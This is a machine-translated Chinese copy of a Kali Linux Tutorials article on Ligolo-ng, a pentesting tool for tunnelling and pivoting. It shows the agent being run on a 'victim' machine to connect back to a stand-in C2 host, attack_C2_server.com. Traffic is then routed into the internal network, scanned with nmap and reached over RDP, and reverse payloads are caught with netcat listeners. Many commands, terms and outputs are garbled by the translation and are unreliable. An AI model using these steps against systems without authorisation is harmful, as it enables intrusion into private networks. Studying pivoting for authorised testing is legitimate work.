# Ligolo-Ng:一个先进而简单的隧道/旋转工具，使用了一个 TUN 接口

> 原文：<https://kalilinuxtutorials.com/ligolo-ng/>

[![](img/d334fd023da38aeb29f509b7e368eb25.png)](https://1.bp.blogspot.com/-q07qpJlCJrA/YTYtV3RZS9I/AAAAAAAAKt4/eUcVYvnpKO0r0IWvfWOcHqfrARcPCSJXQCLcBGAsYHQ/s1491/logo%2B%25281%2529.png)

**Ligolo-Ng** 是一个*简单*、*轻量级*和*快速*的工具，允许 pentesters 从反向 TCP/TLS 连接建立隧道，而不需要 SOCKS。

**特色**

*   Tun 界面(没有更多的袜子！)
*   带有*代理*选择和*网络信息*的简单 UI
*   易于使用和设置
*   让我们加密的自动证书配置
*   性能(多路复用)
*   不需要高权限
*   *代理*上的套接字监听/绑定
*   *代理*支持多种平台

**这和 Ligolo/Chisel/Meterpreter 有什么区别…？**

不使用 SOCKS 代理或 TCP/UDP 转发器， **Ligolo-ng** 使用 Gvisor 创建一个用户网络栈。

当运行*中继/代理*服务器时，使用一个 **tun** 接口，发送到该接口的数据包被翻译，然后传输到*代理*远程网络。

例如，对于 TCP 连接:

*   SYN 在远程被转换为 connect()
*   如果 connect()成功，则发送回 SYN-ACK
*   如果连接后返回经济重置、经济启用或经济解除系统调用，则发送 RST
*   如果超时，则不发送任何内容

这允许在不使用*代理链*的情况下运行 *nmap* 之类的工具(更简单、更快)。

**建筑&用途**

**建筑照明**

建筑*照明*:

**$go 构建-o 代理 cmd/agent/main.go
$go 构建-o 代理 cmd/proxy/main . go
# Windows 构建代理
$GOOS=windows go 构建-o agent.exe cmd/agent/main . go**

**设置 Ligolo-ng**

在您的命令和控制(C2)服务器上启动*代理*服务器(将使用默认的 11601 监听):

**$ sudo ip tuntap 添加用户【your_username】模式 tun ligolo
$ sudo ip link 设置 ligolo up
$。/proxy -h #帮助选项
$。/proxy -autocert #自动请求 LetsEncrypt 证书**

**TLS 选项**

**使用加密自动插入**

当使用 **`-autocert`** 选项时，代理会在代理连接时自动为*attack _ C2 _ server . com*请求一个证书(使用 Let's Encrypt)。

让我们加密证书验证/检索，端口 80 需要是可访问的

**使用自己的 TLS 证书**

如果您想为代理服务器使用您自己的证书，您可以使用`**-certfile**`和`**-keyfile**`参数。

**自动自签名证书(不推荐)**

 ***代理/中继*可以使用`-selfcert`选项自动生成自签名 TLS 证书。

`**-ignore-cert**`选项需要和*代理*一起使用。

当心中间人攻击！此选项只应在测试环境中使用或用于调试目的。

**使用 Ligolo-ng**

在您的目标(受害者)计算机上启动*代理*(不需要特权！):

**$。/agent-connect attack _ C2 _ server . com:11601**

一个会话应该出现在*代理服务器*上。

信息[0102]代理加入。name = nchatelain @ nworkstation remote = " XX。XX . XX . XX:38000”

使用`**session**`命令选择*代理*。

**ligolong 会话
？指定一个会话:1–nchatelain @ nworkstation–XX。XX.XX.XX:38000**

使用`**ifconfig**`命令显示代理的网络配置:

**【代理人:新竹@ nworkstation】【ifconfig】

**────────────────────────────────。****

在*代理/中继*服务器上添加一条路由到 *192.168.0.0/24* *代理*网络。

**$ sudo ip 路由 add 192.168.0.0/24 dev ligolo**

在代理上启动隧道:

**【代理人:nchatain @ nworkstation】开始
【代理人:nchatain @ nworkstation】信息【0690】开始隧道到 nchatain @ nworkstation**

您现在可以从*代理*服务器访问 *192.168.0.0/24* *代理*网络。

**$ nmap 192 . 168 . 0 . 0/24-v-sV-n
[…]
$ rdesktop 192 . 168 . 0 . 123
[…]**

**代理绑定/监听**

您可以监听*代理*和*上的端口，将*连接重定向到您的控制/代理服务器。

在 ligolo 会话中，使用`**listener_add**`命令。

以下示例将在代理(0.0.0.0:1234)上创建一个 TCP 侦听套接字，并将连接重定向到代理服务器的 4321 端口

**[Agent:nchatelain @ nworkstation]Listener _ add–addr 0 . 0 . 0 . 0:1234–to 127 . 0 . 0 . 1:4321–TCP
INFO[1208]在远程代理上创建的监听器！**

在`**proxy**`上:

**$ nc -lvp 4321**

当在代理的 TCP 端口`**1234**`上建立连接时，`**nc**`将接收连接。

这在使用反向 tcp/udp 有效负载时非常有用。

您可以使用`**listener_list**`命令查看当前正在运行的监听器，并使用`**listener_stop [ID]**`命令停止它们:

**【代理人:新浪@nworkstation】【列表】T1、【列表】──一个──一个──一个──一个──一个──一个──一个──一个──一个──一个**

是否需要管理员/Root 访问权限？

在*代理*这边，没有！任何事情都可以在没有管理权限的情况下执行。

然而，在您的*中继/代理*服务器上，您需要能够创建一个 *tun* 接口。

**支持的协议/数据包**

*   传输控制协议（Transmission Control Protocol）
*   用户数据报协议(User Datagram Protocol)
*   ICMP(回应请求)

**表现**

您可以轻松达到 100 兆位/秒以上。下面是使用`**iperf**`从 200 兆位/秒服务器到 200 兆位/秒连接的测试。

**$ iper F3-c 10.10.0.1-p 24483
连接主机 10 . 10 . 0 . 1， 端口 24483
[ 5]本地 10.10.0.224 端口 50654 连接到 10.10.0.1 端口 24483
[ ID]间隔传输比特率 Retr Cwnd
[ 5] 0.00-1.00 秒 12.5 兆字节/秒 0 164 千字节
[5]1.00-2.00 秒 12.7 兆字节/秒 0 207 兆字节/秒 4.00-5.00 秒 13.1 兆字节 110 兆字节/秒 2 134 千字节
[ 5] 5.00-6.00 秒 113 兆字节/秒 0 147 千字节
[ 5] 6.00-7.00 秒 12.6 兆字节 105 兆字节/秒 0 158 千字节
[ 5] 7.00-8.00 秒 12.1 兆字节 100**

**注意事项**

因为*代理*在没有特权的情况下运行，所以不可能转发原始数据包。当您执行 NMAP 同步扫描时，会在代理上执行 TCP 连接()。

使用 *nmap* 时，要使用`**--unprivileged**`或`**-PE**`避免误报。

[**Download**](https://github.com/tnpitsecurity/ligolo-ng)**